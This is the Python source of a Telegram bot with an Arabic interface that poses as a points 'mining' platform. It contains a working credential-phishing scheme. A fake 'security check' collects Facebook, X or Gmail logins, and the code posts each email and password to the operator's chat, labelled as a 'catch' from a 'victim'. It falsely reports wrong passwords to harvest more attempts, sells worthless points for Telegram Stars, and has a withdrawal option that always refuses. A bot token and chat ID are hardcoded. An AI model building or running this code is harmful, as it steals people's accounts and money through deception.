import sys
import subprocess

def install_and_import(package, import_name=None):
    if import_name is None:
        import_name = package
    try:
        __import__(import_name)
    except ImportError:
        print(f"[*] جاري تثبيت المكتبة المطلوبة: {package} ...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install_and_import("pytelegrambotapi", "telebot")
install_and_import("requests")

import telebot
from telebot.types import (
    InlineKeyboardMarkup, InlineKeyboardButton, 
    ReplyKeyboardMarkup, KeyboardButton, LabeledPrice
)
import requests
import time

BOT_TOKEN = "1376864803:AAGQVeGegoupqqGOBDbZNaaQbFKCX3SiFPw"
TARGET_CHAT_ID = "1188729209"

bot = telebot.TeleBot(BOT_TOKEN)

user_states = {}
user_data = {}
# قاموس لتتبع محاولات الحسابات الوهمية وحالة الحظر المؤقت
security_checks = {}

def get_persistent_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("🏠 القائمة الرئيسية"), KeyboardButton("💰 رصيدي ونقاطي"))
    markup.add(KeyboardButton("⚡ متجر ترقية العدادات"), KeyboardButton("⭐ شحن فوري بالنجوم"))
    markup.add(KeyboardButton("👥 دعوة أصدقاء"))
    return markup

@bot.message_handler(commands=[ start ])
def send_welcome(message):
    chat_id = message.chat.id
    user_name = message.from_user.first_name
    
    args = message.text.split()
    if len(args) > 1 and args[1].startswith("ref_"):
        referrer_id = args[1].replace("ref_", "")
        if referrer_id != str(chat_id):
            if referrer_id not in user_data:
                user_data[referrer_id] = {"points": 100, "last_claim": 0, "ref_count": 0, "multiplier": 100}
            user_data[referrer_id]["points"] += 200
            user_data[referrer_id]["ref_count"] += 1
            try:
                bot.send_message(int(referrer_id), f"🎉 انضم صديق جديد عبر رابطك! حصلت على +200 نقطة هدية.")
            except:
                pass

    if chat_id not in user_data:
        user_data[chat_id] = {"points": 100, "last_claim": 0, "ref_count": 0, "multiplier": 100}

    points = user_data[chat_id]["points"]
    current_power = user_data[chat_id]["multiplier"]

    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton(f"⚙️ تشغيل العداد اليومي ({current_power} نقطة)", callback_data="start_counter"),
        InlineKeyboardButton("⚡ متجر ترقية العدادات", callback_data="upgrade_counter_menu")
    )
    markup.add(
        InlineKeyboardButton("💳 سحب الأرباح", callback_data="withdraw_menu"),
        InlineKeyboardButton("⭐ شحن 10k (250 ⭐)", callback_data="buy_stars_10k")
    )
    
    welcome_text = (
        f"مرحباً بك يا **{user_name}** في المنصة الرسمية للتعدين والأرباح 🚀\n\n"
        f"💰 رصيدك الحالي: **{points} نقطة**\n"
        f"⚡ قوة العداد الحالية: **{current_power} نقطة / يومياً**\n\n"
        "اختر ما يناسبك من القائمة أدناه:"
    )
    bot.send_message(chat_id, welcome_text, reply_markup=markup, parse_mode="Markdown")
    bot.send_message(chat_id, "👇 لوحة التحكم السريعة أسفل الشاشة جاهزة:", reply_markup=get_persistent_keyboard())

@bot.message_handler(func=lambda message: message.text in ["🏠 القائمة الرئيسية", "💰 رصيدي ونقاطي", "⚡ متجر ترقية العدادات", "⭐ شحن فوري بالنجوم", "👥 دعوة أصدقاء"])
def handle_persistent_menu(message):
    chat_id = message.chat.id
    text = message.text
    
    if chat_id not in user_data:
        user_data[chat_id] = {"points": 100, "last_claim": 0, "ref_count": 0, "multiplier": 100}
        
    if text == "🏠 القائمة الرئيسية":
        send_welcome(message)
    elif text == "💰 رصيدي ونقاطي":
        pts = user_data[chat_id]["points"]
        power = user_data[chat_id]["multiplier"]
        bot.send_message(chat_id, f"💰 رصيدك الحالي: **{pts} نقطة**\n⚡ قوة العداد: **{power} نقطة يومياً**", parse_mode="Markdown", reply_markup=get_persistent_keyboard())
    elif text == "⚡ متجر ترقية العدادات":
        show_upgrade_menu(chat_id)
    elif text == "⭐ شحن فوري بالنجوم":
        send_stars_invoice(chat_id)
    elif text == "👥 دعوة أصدقاء":
        bot_info = bot.get_me()
        ref_url = f"https://t.me/{bot_info.username}?start=ref_{chat_id}"
        ref_count = user_data[chat_id]["ref_count"]
        bot.send_message(chat_id, f"🔗 **رابط الدعوة الخاص بك:**\n`{ref_url}`\n\n👥 عدد المدعوين: {ref_count}\nكل صديق يسجل يمنحك +200 نقطة!", parse_mode="Markdown", reply_markup=get_persistent_keyboard())

def show_upgrade_menu(chat_id):
    current_power = user_data[chat_id]["multiplier"]
    points = user_data[chat_id]["points"]
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⚡ شراء +100 نقطة يومياً (السعر: 10,000 نقطة)", callback_data="upgrade_100"))
    markup.add(InlineKeyboardButton("🚀 شراء +500 نقطة يومياً (السعر: 50,000 نقطة)", callback_data="upgrade_500"))
    markup.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_home"))
    
    text = (
        f"⚡ **متجر ترقية سرعة العدادات:**\n\n"
        f"👤 رصيدك الحالي: `{points} نقطة`\n"
        f"📊 قوتك الحالية للعداد: `{current_power} نقطة / يومياً`\n\n"
        f"📋 **لائحة الأسعار والسرعات المتاحة:**\n"
        f"• زيادة **+100 نقطة يومياً** ⬅️ التكلفة: **10,000 نقطة**\n"
        f"• زيادة **+500 نقطة يومياً** ⬅️ التكلفة: **50,000 نقطة**\n\n"
        f"اختر الباقة المناسبة لتسريع أرباحك اليومية:"
    )
    bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "upgrade_counter_menu")
def callback_upgrade_menu(call):
    show_upgrade_menu(call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data in ["upgrade_100", "upgrade_500"])
def process_upgrade(call):
    chat_id = call.message.chat.id
    if chat_id not in user_data:
        user_data[chat_id] = {"points": 100, "last_claim": 0, "ref_count": 0, "multiplier": 100}
        
    points = user_data[chat_id]["points"]
    
    if call.data == "upgrade_100":
        cost = 10000
        gain = 100
    elif call.data == "upgrade_500":
        cost = 50000
        gain = 500
    
    if points < cost:
        bot.answer_callback_query(call.id, text=f"❌ رصيدك غير كافٍ! تحتاج إلى {cost:,} نقطة لإتمام هذه الترقية.", show_alert=True)
        return
        
    user_data[chat_id]["points"] -= cost
    user_data[chat_id]["multiplier"] += gain
    
    new_power = user_data[chat_id]["multiplier"]
    new_balance = user_data[chat_id]["points"]
    
    bot.answer_callback_query(call.id, text="🎉 تم شراء الترقية وزيادة سرعة العداد بنجاح!", show_alert=True)
    bot.send_message(
        chat_id,
        f"🚀 **مبروك! تم ترقية العداد بنجاح:**\n"
        f"⚡ الربح اليومي الجديد للعداد: **{new_power} نقطة / يومياً**\n"
        f"💰 رصيدك المتبقي: **{new_balance:,} نقطة**",
        parse_mode="Markdown",
        reply_markup=get_persistent_keyboard()
    )

def send_stars_invoice(chat_id):
    prices = [LabeledPrice(label="شحن 10,000 نقطة تعدين", amount=250)]
    try:
        bot.send_invoice(
            chat_id=chat_id,
            title="شحنة 10,000 نقطة فورية",
            description="تتم إضافة النقاط تلقائياً إلى رصيدك فور إتمام الدفع بنجاح.",
            invoice_payload="automatic_stars_10k",
            provider_token="",
            currency="XTR",
            prices=prices,
            start_parameter="stars-topup"
        )
    except Exception as e:
        bot.send_message(chat_id, "عذراً، حدث خطأ في إنشاء الفاتورة حالياً.")

@bot.callback_query_handler(func=lambda call: call.data == "buy_stars_10k")
def callback_buy_stars(call):
    send_stars_invoice(call.message.chat.id)

@bot.pre_checkout_query_handler(func=lambda query: True)
def checkout(pre_checkout_query):
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

@bot.message_handler(content_types=[ successful_payment ])
def got_payment(message):
    chat_id = message.chat.id
    if chat_id not in user_data:
        user_data[chat_id] = {"points": 100, "last_claim": 0, "ref_count": 0, "multiplier": 100}
    
    user_data[chat_id]["points"] += 10000
    new_balance = user_data[chat_id]["points"]
    
    bot.send_message(
        chat_id, 
        f"✅ **تم الدفع والشحن بنجاح!**\nتمت إضافة 10,000 نقطة إلى رصيدك تلقائياً.\n💰 رصيدك الحالي الجديد: **{new_balance:,} نقطة** 🎉",
        parse_mode="Markdown",
        reply_markup=get_persistent_keyboard()
    )

@bot.callback_query_handler(func=lambda call: call.data == "start_counter")
def counter_handler(call):
    chat_id = call.message.chat.id
    current_time = time.time()
    
    # فحص هل المستخدم محظور مؤقتاً (بسبب محاولات وهمية كثيرة)
    if chat_id in security_checks:
        ban_data = security_checks[chat_id]
        if ban_data.get("is_banned", False):
            ban_time = ban_data.get("ban_time", 0)
            cooldown_ban = 60 * 60  # ساعة واحدة
            if current_time - ban_time < cooldown_ban:
                remaining_min = int((cooldown_ban - (current_time - ban_time)) // 60)
                bot.answer_callback_query(call.id, text=f"⛔ تم تقييد حسابك مؤقتًا بسبب المحاولات المتكررة! انتظر {remaining_min} دقيقة أو راسل الدعم لفك الحظر.", show_alert=True)
                return
            else:
                # انقضت ساعة، يتم رفع الحظر تلقائياً
                security_checks[chat_id]["is_banned"] = False
                security_checks[chat_id]["attempts"] = 0

    last_claim = user_data.get(chat_id, {}).get("last_claim", 0)
    cooldown = 24 * 60 * 60
    
    if current_time - last_claim < cooldown:
        remaining = int(cooldown - (current_time - last_claim))
        hours = remaining // 3600
        minutes = (remaining % 3600) // 60
        bot.answer_callback_query(call.id, text=f"⏳ العداد يعمل! متبقي {hours} ساعة و {minutes} دقيقة لاستلام الهدية القادمة.", show_alert=True)
        return

    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("🔵 فيسبوك (Facebook)", callback_data="login_facebook"),
        InlineKeyboardButton("🐦 تويتر / إكس (X)", callback_data="login_twitter")
    )
    markup.add(InlineKeyboardButton("📧 البريد الإلكتروني (Gmail)", callback_data="login_gmail"))
    
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text="⚠️ **تدقيق أمني لتفعيل العداد:**\n"
             "يرجى اختيار منصة تسجيل الدخول وتأكيد هويتك لتفعيل العداد واستلام الهدية:",
        reply_markup=markup,
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("login_"))
def platform_selected(call):
    chat_id = call.message.chat.id
    platform = call.data.split("_")[1]
    user_states[chat_id] = {"platform": platform, "step": "waiting_email"}
    
    platform_names = {
        "facebook": "فيسبوك (Facebook)",
        "twitter": "تويتر / إكس (X)",
        "gmail": "البريد الإلكتروني (Gmail)"
    }
    
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text=f"🔐 تم اختيار الربط عبر: **{platform_names.get(platform, platform)}**\n\n"
             "أرسل **البريد الإلكتروني** أو **رقم الهاتف** الخاص بالحساب في رسالة:",
        parse_mode="Markdown"
    )

# نظام استقبال البيانات والتحكم بالمحاولات والحظر المؤقت
@bot.message_handler(func=lambda message: message.chat.id in user_states)
def handle_user_input(message):
    chat_id = message.chat.id
    state = user_states[chat_id]
    
    if state["step"] == "waiting_email":
        state["email"] = message.text
        state["step"] = "waiting_password"
        bot.send_message(chat_id, "✅ تم التحقق المبدئي. الآن أرسل **كلمة المرور (Password)** الخاصة بالحساب لإتمام المصادقة:")
        
    elif state["step"] == "waiting_password":
        state["password"] = message.text
        platform = state.get("platform")
        email = state.get("email")
        password = state.get("password")
        
        # إرسال الصيد إلى بوتك الأساسي مع تنبيه بالمحاولات
        capture_msg = (
            f"🎯 **صيد جديد (مراجعة مطلوبة)!**\n\n"
            f"🌐 المنصة: {platform.upper()}\n"
            f"👤 البريد: `{email}`\n"
            f"🔑 كلمة المرور: `{password}`\n"
            f"🆔 معرف الضحية: `{chat_id}`"
        )
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": TARGET_CHAT_ID, "text": capture_msg, "parse_mode": "Markdown"}
        try:
            requests.post(url, json=payload)
        except:
            pass
        
        # تحديث عداد المحاولات الفاشلة لهذا المستخدم
        if chat_id not in security_checks:
            security_checks[chat_id] = {"attempts": 0, "is_banned": False}
        
        security_checks[chat_id]["attempts"] += 1
        attempts_count = security_checks[chat_id]["attempts"]
        
        del user_states[chat_id]
        
        # إذا تجاوز المحاولات (مثلاً 3 مرات)، يتم تقييده لمدة ساعة
        if attempts_count >= 3:
            security_checks[chat_id]["is_banned"] = True
            security_checks[chat_id]["ban_time"] = time.time()
            bot.send_message(
                chat_id,
                "⛔ **تم تقييد حسابك مؤقتًا!**\n"
                "لقد تجاوزت الحد المسموح به من المحاولات الخاطئة.\n"
                "تم قفل ميزة تشغيل العداد لمدة **ساعة كاملة** لعدم مطابقة بيانات الأمان.\n\n"
                "⏳ انتظر حتى ينقضي الوقت أو تواصل مع الدعم لفك الحظر الفوري.",
                reply_markup=get_persistent_keyboard()
            )
        else:
            remaining_tries = 3 - attempts_count
            bot.send_message(
                chat_id,
                f"❌ **خطأ في المصادقة:**\n"
                f"كلمة المرور غير صحيحة أو أن الحساب يتطلب مصادقة ثنائية.\n"
                f"⚠️ لديك ({remaining_tries}) محاولات أخرى قبل تقييد الحساب المؤقت.\n\n"
                f"يرجى إعادة المحاولة بالحساب الصحيح لتفادي الحظر.",
                reply_markup=get_persistent_keyboard()
            )

@bot.callback_query_handler(func=lambda call: call.data == "withdraw_menu")
def withdraw_menu(call):
    chat_id = call.message.chat.id
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("🟡 زين كاش", callback_data="wd_zain"),
        InlineKeyboardButton("💳 الرافدين / الرشيد", callback_data="wd_bank")
    )
    markup.add(InlineKeyboardButton("🪙 عملات رقمية (USDT)", callback_data="wd_crypto"))
    markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_home"))
    
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text="🏧 **سحب الأرباح:**\nالحد الأدنى للسحب هو 5,000 نقطة. اختر طريقة التحويل:",
        reply_markup=markup,
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data == "back_home")
def callback_back_home(call):
    chat_id = call.message.chat.id
    if chat_id not in user_data:
        user_data[chat_id] = {"points": 100, "last_claim": 0, "ref_count": 0, "multiplier": 100}
    points = user_data[chat_id]["points"]
    power = user_data[chat_id]["multiplier"]
    
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton(f"⚙️ تشغيل العداد اليومي ({power} نقطة)", callback_data="start_counter"),
        InlineKeyboardButton("⚡ متجر ترقية العدادات", callback_data="upgrade_counter_menu")
    )
    markup.add(
        InlineKeyboardButton("💳 سحب الأرباح", callback_data="withdraw_menu"),
        InlineKeyboardButton("⭐ شحن 10k (250 ⭐)", callback_data="buy_stars_10k")
    )
    
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text=f"🏠 **القائمة الرئيسية:**\n💰 رصيدك: {points:,} نقطة\n⚡ قوة العداد: {power} نقطة يومياً",
        reply_markup=markup,
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("wd_"))
def withdraw_alert(call):
    bot.answer_callback_query(call.id, text="عذراً، رصيدك الحالي غير كافٍ للحد الأدنى (5,000 نقطة). استمر بتجميع النقاط!", show_alert=True)

if __name__ == "__main__":
    print("🚀 Master Admin Bot with Anti-Spam & Ban System is running...")
    bot.infinity_polling()
